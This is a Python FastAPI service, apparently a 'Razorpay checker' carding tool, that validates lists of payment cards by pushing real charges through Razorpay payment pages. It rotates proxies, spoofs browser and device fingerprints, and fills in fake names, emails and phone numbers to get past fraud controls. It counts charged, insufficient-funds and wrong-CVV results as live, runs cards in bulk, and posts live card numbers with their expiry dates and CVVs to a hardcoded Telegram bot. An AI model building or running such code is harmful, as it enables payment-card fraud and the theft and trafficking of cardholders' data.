import os
import asyncio
import time
import json
import re
import sys
import hashlib
import secrets
import base64
import random
import string
from datetime import datetime
from urllib.parse import quote

import httpx
import uvicorn
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from fastapi import Request
from pydantic import BaseModel
from typing import List
from fake_useragent import UserAgent
from faker import Faker

# ------------------------------------------------------------
#  Configuration
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8674734836:AAFkWwr2Mq-X0_LFvvmhcCw0-hqFBmF3IGk")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "7649435831")

DEFAULT_SEND_ON = "CHARGED,INSUFFICIENT_FUNDS"
TELEGRAM_SEND_ON = set(
    s.strip() for s in os.getenv("TELEGRAM_SEND_ON", DEFAULT_SEND_ON).split(",") if s.strip()
)

# ------------------------------------------------------------
#  Print header immediately on startup
# ------------------------------------------------------------
print("\033[1;35;40m" + r"""
███╗   ██╗ ██████╗ ████████╗███████╗██████╗ 
████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║   ██║   █████╗  ██████╔╝
██║╚██╗██║██║   ██║   ██║   ██╔══╝  ██╔══██╗
██║ ╚████║╚██████╔╝   ██║   ██║     ██║  ██║
╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝
                                            
    razor x checker
      @BlackXxCard
    razorpay endpoint (NO LIMITS EDITION)
""" + "\033[0m")

if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
    print(f"\033[92m📨 Telegram notifications ENABLED (chat: {TELEGRAM_CHAT_ID})\033[0m")
    print(f"\033[93m   Sending on: {', '.join(TELEGRAM_SEND_ON)}\033[0m")
else:
    print("\033[91m📨 Telegram notifications DISABLED\033[0m")

# ------------------------------------------------------------
#  Helpers
# ------------------------------------------------------------
fake = Faker()

# NO artificial delays - let the network handle it
API_DELAY = float(os.getenv("API_DELAY", "0.0"))

BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

def find_between(content, start, end):
    try:
        start_idx = content.index(start) + len(start)
        end_idx = content.index(end, start_idx)
        return content[start_idx:end_idx]
    except ValueError:
        return ""

def gen_indian_phone():
    first_digit = random.choice(['6', '7', '8', '9'])
    rest = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    return first_digit + rest

def parse_http_proxy(proxy_input):
    if not proxy_input:
        return None
    if proxy_input.count(':') == 3 and '@' not in proxy_input:
        parts = proxy_input.split(':')
        if parts[1].isdigit():
            ip, port, user, pwd = parts
            proxy_input = f"http://{user}:{pwd}@{ip}:{port}"
        else:
            user, pwd, ip, port = parts
            proxy_input = f"http://{user}:{pwd}@{ip}:{port}"
    elif '@' in proxy_input and '://' not in proxy_input:
        proxy_input = 'http://' + proxy_input
    elif proxy_input.count(':') == 1 and '://' not in proxy_input:
        proxy_input = 'http://' + proxy_input
    if not proxy_input.startswith(('http://', 'https://')):
        proxy_input = 'http://' + proxy_input
    return {"http://": proxy_input, "https://": proxy_input}

def get_card_brand(card_number):
    if card_number.startswith("4"):
        return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"):
        return "mastercard"
    elif card_number[:2] in ("34", "37"):
        return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"):
        return "discover"
    elif card_number.startswith("35"):
        return "jcb"
    elif card_number.startswith("62"):
        return "unionpay"
    return "unknown"

def parse_razorpay_error(error_data: dict) -> tuple:
    """Parse Razorpay error response and return (status, message, code)"""
    error_desc = error_data.get("description", "Unknown Error")
    err_code = error_data.get("reason", "N/A")
    error_desc = error_desc.replace(
        " Try another payment method or contact your bank for details.", ""
    ).replace(
        "Try another payment method or contact your bank for details.", ""
    )
    msg_lower = error_desc.lower()

    if any(k in msg_lower for k in ["insufficient account balance", "maximum transaction limit"]):
        return "INSUFFICIENT_FUNDS", error_desc, err_code
    elif "cvv provided is incorrect" in msg_lower or "incorrect_cvv" in msg_lower:
        return "INCORRECT_CVV", error_desc, err_code
    else:
        return "DECLINED", error_desc, err_code

async def send_telegram_message(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    print(f"\n\033[96m📨 Sending Telegram notification...\033[0m")
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            resp = await client.post(url, json=payload)
            if resp.status_code == 200:
                print("\033[92m   ✅ Telegram message sent\033[0m")
            else:
                print(f"   ⚠️ Telegram error: {resp.status_code}")
    except Exception as e:
        print(f"\033[91m   ❌ Telegram exception: {e}\033[0m")

# ------------------------------------------------------------
#  Core Razorpay logic - NO SEMAPHORE, NO SHARED CLIENT
# ------------------------------------------------------------
async def run_razorpay_check(cc_data: str, url: str, proxy: str = None, amount: int = 1, bulk_mode: bool = False):
    result = {
        "Response": "UNKNOWN",
        "CC": cc_data,
        "Amount": f"{amount}₹",
        "Gate": "Razorpay",
        "Site": url,
        "details": {}
    }

    proxy_dict = parse_http_proxy(proxy) if proxy else None
    
    # Fresh client per request - completely isolated
    client_kwargs = {
        'follow_redirects': True,
        'timeout': httpx.Timeout(30.0, connect=10.0),
        'verify': False,
        'http2': True,
    }
    if proxy_dict:
        proxy_url = proxy_dict.get("http://") or proxy_dict.get("http")
        client_kwargs['proxy'] = proxy_url
    
    async with httpx.AsyncClient(**client_kwargs) as client:
        try:
            cc_parts = cc_data.split("|")
            cc = cc_parts[0].strip()
            mm = cc_parts[1].strip().zfill(2)
            yy = cc_parts[2].strip()[-2:]
            cvv = cc_parts[3].strip()
            year = int("20" + yy)

            brand = get_card_brand(cc)
            h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
            ts = str(int(time.time() * 1000))
            rnd = str(random.randrange(10**8)).zfill(8)
            rzp_device_id = f"1.{h}.{ts}.{rnd}"
            BASE62 = string.ascii_letters + string.digits
            rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))

            ua = UserAgent().chrome
            phone_full = "+91" + gen_indian_phone()
            phone_short = phone_full[3:]
            email = fake.user_name() + "@gmail.com"
            amo = amount * 100

            # 1. Fetch page data
            resp_init = await client.get(url)
            if resp_init.status_code != 200:
                result["Response"] = "ERROR"
                result["details"]["error"] = f"Failed to fetch page: {resp_init.status_code}"
                return result

            try:
                json_text = re.search(r'var data = ({.*?});', resp_init.text, re.DOTALL).group(1)
                init_data = json.loads(json_text)
                kyid = init_data["key_id"]
                plink = init_data["payment_link"]["id"]
                ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
                keyless_header = init_data.get("keyless_header")
                keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')
            except Exception:
                result["Response"] = "ERROR"
                result["details"]["error"] = "Site data fetch failed"
                return result

            # 2. Create order
            headers_order = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Origin': 'https://pages.razorpay.com',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua,
            }
            json_order = {
                'notes': {'comment': '', 'name': 'Not Fr'},
                'line_items': [{'payment_page_item_id': ppid, 'amount': amo}],
            }
            resp_order = await client.post(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                headers=headers_order, json=json_order
            )
            try:
                order_data = resp_order.json()
                order_id = order_data["order"]["id"]
                checkout_id = order_id.split("_")[1]
            except Exception:
                result["Response"] = "ERROR"
                result["details"]["error"] = "order_id not found"
                return result

            # 3. Get public session
            headers_public = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua,
            }
            params_public = {
                'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
                'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
                'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
            }
            resp_public = await client.get(
                'https://api.razorpay.com/v1/checkout/public',
                params=params_public, headers=headers_public
            )
            sessid = find_between(resp_public.text, 'window.session_token="', '";')
            if not sessid:
                match = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
                if match:
                    sessid = match.group(1)
            if not sessid:
                result["Response"] = "ERROR"
                result["details"]["error"] = "session_token not found"
                return result

            # 4. Preferences (skip in bulk mode)
            if not bulk_mode:
                headers_pref = {
                    'Accept': '*/*', 'Content-type': 'application/json', 'Origin': 'https://api.razorpay.com',
                    'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                    'User-Agent': ua, 'x-session-token': sessid,
                }
                params_pref = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
                json_pref = {
                    'query': [{'resource': r} for r in ['checkout_version_config', 'merchant', 'merchant_features', 'downtime', 'customer', 'customer_tokens', 'truecaller', 'methods', 'experiments', 'offers', 'checkout_config', 'order', 'invoice', 'buyer_protection', 'personalization']],
                    'query_params': {
                        'device_id': rzp_device_id, 'rtb_device_id': h, 'amount': amo,
                        'currency': 'INR', 'option_currency': 'INR', 'truecaller': False,
                        'qr_required': False, 'library': 'checkoutjs', 'platform': 'browser',
                        'order_id': order_id, 'payment_link_id': plink, 'contact': phone_full,
                    },
                    'action': 'get',
                }
                await client.post(
                    'https://api.razorpay.com/v2/standard_checkout/preferences',
                    params=params_pref, headers=headers_pref, content=json.dumps(json_pref)
                )

            # 5. Checkout order
            headers_co = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            params_co = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            data_co = {
                'notes[email]': email, 'notes[phone]': phone_short, 'payment_link_id': plink,
                'key_id': kyid, 'contact': phone_full, 'email': email, 'currency': 'INR',
                '_[integration]': 'payment_pages', '_[device.id]': rzp_device_id,
                '_[library]': 'checkoutjs', '_[library_src]': 'no-src', '_[current_script_src]': 'no-src',
                '_[platform]': 'browser', '_[env]': '', '_[is_magic_script]': 'false', '_[os]': 'windows',
                '_[shield][fhash]': h, '_[shield][tz]': '0', '_[device_id]': rzp_device_id,
                '_[build]': BUILD, '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
                '_[shield][browser]': 'chrome', '_[request_index]': '0', 'amount': amo,
                'order_id': order_id, 'method': 'card', 'checkout_id': checkout_id,
            }
            resp_co_order = await client.post(
                'https://api.razorpay.com/v1/standard_checkout/checkout/order',
                params=params_co, headers=headers_co, data=data_co
            )
            try:
                coid_local = resp_co_order.json().get("checkout_id", checkout_id)
            except Exception:
                coid_local = checkout_id

            # 6. Card info & payment
            headers_pay = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            params_pay = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            data_pay = {
                'method': 'card', 'card[number]': cc, 'card[expiry_month]': mm, 'card[expiry_year]': year,
                'card[cvv]': cvv, 'card[name]': fake.name(), 'email': email, 'contact': phone_full,
                'order_id': order_id, 'amount': amo, 'currency': 'INR', 'checkout_id': coid_local,
                '_[integration]': 'payment_pages', '_[device.id]': rzp_device_id, '_[library]': 'checkoutjs',
                '_[library_src]': 'no-src', '_[current_script_src]': 'no-src', '_[platform]': 'browser',
                '_[env]': '', '_[is_magic_script]': 'false', '_[os]': 'windows', '_[shield][fhash]': h,
                '_[shield][tz]': '0', '_[device_id]': rzp_device_id, '_[build]': BUILD, '_[shield][os]': 'windows',
                '_[shield][platform]': 'browser', '_[shield][browser]': 'chrome', '_[request_index]': '1',
            }
            resp_pay = await client.post(
                'https://api.razorpay.com/v1/standard_checkout/payments',
                params=params_pay, headers=headers_pay, data=data_pay
            )
            
            pay_json = resp_pay.json()
            if "error" in pay_json:
                status, msg, code = parse_razorpay_error(pay_json["error"])
                result["Response"] = status
                result["details"]["message"] = msg
                result["details"]["code"] = code
                return result

            payment_id = pay_json.get("razorpay_payment_id")
            if not payment_id:
                result["Response"] = "DECLINED"
                result["details"]["message"] = "Payment ID not found"
                return result

            # 7. 3DS Auth
            headers_3ds = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            pid_clean = payment_id.replace("pay_", "")
            browser_data = {
                'browser[color_depth]': str(random.choice([24, 32])),
                'browser[screen_width]': str(random.choice([1920, 1366, 1536, 1440])),
                'browser[screen_height]': str(random.choice([1080, 768, 864, 900])),
                'browser[language]': 'en-US', 'auth_step': '3ds2Auth'
            }
            url_auth_final = f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate"
            await client.post(url_auth_final, headers=headers_3ds, data=browser_data)

            # 8. Get final status
            headers_fin = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            params_fin = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            resp_final = await client.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel",
                params=params_fin, headers=headers_fin
            )

            final_text = resp_final.text
            try:
                final_json = json.loads(final_text)
            except Exception:
                result["Response"] = "ERROR"
                result["details"]["error"] = "Invalid final response"
                result["details"]["raw"] = final_text[:500]
                return result

            if "razorpay_payment_id" in final_text:
                payment_id_final = final_json.get("razorpay_payment_id", "N/A")
                result["Response"] = "CHARGED"
                result["details"]["payment_id"] = payment_id_final
                result["details"]["message"] = "Payment Successfully"
            else:
                if "error" in final_json:
                    status, msg, code = parse_razorpay_error(final_json["error"])
                    result["Response"] = status
                    result["details"]["message"] = msg
                    result["details"]["code"] = code
                else:
                    result["Response"] = "DECLINED"
                    result["details"]["message"] = "Unknown Error"
                    result["details"]["code"] = "N/A"

            return result

        except Exception as e:
            result["Response"] = "EXCEPTION"
            result["details"]["exception"] = str(e)
            return result

# ------------------------------------------------------------
#  FastAPI app - NO LIMITS
# ------------------------------------------------------------
app = FastAPI(title="𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮 𝙓 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 (NO LIMITS)")

@app.get("/rz", response_class=JSONResponse)
async def razorpay_check(
    cc: str = Query(..., description="Single card: cc|mm|yy|cvv OR multiple cards comma-separated"),
    url: str = Query("https://pages.razorpay.com/myglobalhost", description="Razorpay payment page URL"),
    amount: int = Query(1, description="Amount in INR"),
    proxy: str = Query(None, description="host:port:user:pass or host:port")
):
    start_time = time.time()
    
    cards = [c.strip() for c in cc.split(",") if c.strip()]
    
    if len(cards) == 1:
        single_cc = cards[0]
        if "|" not in single_cc:
            raise HTTPException(status_code=400, detail="Invalid cc format. Use cc|mm|yy|cvv")
        
        result = await run_razorpay_check(single_cc, url, proxy, amount, bulk_mode=False)
        elapsed = round(time.time() - start_time, 2)

        if result["Response"] in ("ERROR", "EXCEPTION"):
            error_msg = result.get("details", {}).get("error", result.get("details", {}).get("exception", "Unknown error"))
            # User requested: response and status (Approved/Declined)
            return JSONResponse(status_code=200, content={
                "status": "Declined",
                "response": error_msg
            })

        response_label = result["Response"]
        real_message = result.get("details", {}).get("message", "")
        display_response = real_message if real_message else response_label
        
        # Mapping logic: CHARGED, INSUFFICIENT_FUNDS, INCORRECT_CVV -> Approved
        if response_label in ("CHARGED", "INSUFFICIENT_FUNDS", "INCORRECT_CVV"):
            final_status = "Approved"
        else:
            final_status = "Declined"

        # Telegram notification (Keeping existing logic)
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID and response_label in TELEGRAM_SEND_ON:
            if response_label == "CHARGED":
                status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            elif response_label == "INSUFFICIENT_FUNDS":
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            else:
                status_header = response_label
            message = f"""
<b>{status_header}</b>

<b>𝗖𝗖 ⇾</b> <code>{result['CC']}</code>
<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> {result['Gate']}
<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> {display_response}
<b>𝗔𝗺𝗼𝘂𝗻𝘁 ⇾</b> {result['Amount']} 💸
<b>𝗦𝗶𝘁𝗲 ⇾</b> {result['Site']}

<b>𝗧𝗼𝗼𝗸 {elapsed} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀</b>
"""
            asyncio.create_task(send_telegram_message(message.strip()))

        # Return only response and status
        return {
            "status": final_status,
            "response": display_response
        }
    
    else:
        # Bulk cards logic (Keeping original structure but mapping response)
        async def check_one_card(card: str):
            if not card or "|" not in card:
                return {"status": "Declined", "response": "Invalid card format"}
            try:
                result = await run_razorpay_check(card, url, proxy, amount, bulk_mode=True)
                response_label = result["Response"]
                real_message = result.get("details", {}).get("message", "")
                display_response = real_message if real_message else response_label
                
                if response_label in ("CHARGED", "INSUFFICIENT_FUNDS", "INCORRECT_CVV"):
                    final_status = "Approved"
                else:
                    final_status = "Declined"
                
                return {
                    "status": final_status,
                    "response": display_response
                }
            except Exception as e:
                return {"status": "Declined", "response": str(e)}

        results = await asyncio.gather(*[check_one_card(card) for card in cards])
        return results

# Keep /rz/bulk for backward compatibility
@app.api_route("/rz/bulk", methods=["GET", "POST"], response_class=JSONResponse)
async def razorpay_bulk_check(request: Request,
                                cc: str = Query(None),
                                url: str = Query("https://pages.razorpay.com/myglobalhost"),
                                amount: int = Query(1),
                                proxy: str = Query(None)):
    card_list = []
    if request.method == "POST":
        try:
            body = await request.json()
            card_list = body.get("cards", [])
        except Exception:
            raise HTTPException(status_code=400, detail="Invalid JSON body")
    else:
        if not cc:
            raise HTTPException(status_code=400, detail="Missing 'cc' parameter")
        card_list = [c.strip() for c in cc.split(",") if c.strip()]

    async def check_one_card(card: str):
        try:
            result = await run_razorpay_check(card, url, proxy, amount, bulk_mode=True)
            response_label = result["Response"]
            real_message = result.get("details", {}).get("message", "")
            display_response = real_message if real_message else response_label
            if response_label in ("CHARGED", "INSUFFICIENT_FUNDS", "INCORRECT_CVV"):
                final_status = "Approved"
            else:
                final_status = "Declined"
            return {"status": final_status, "response": display_response}
        except Exception as e:
            return {"status": "Declined", "response": str(e)}

    results = await asyncio.gather(*[check_one_card(card) for card in card_list])
    return results

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port, workers=8)
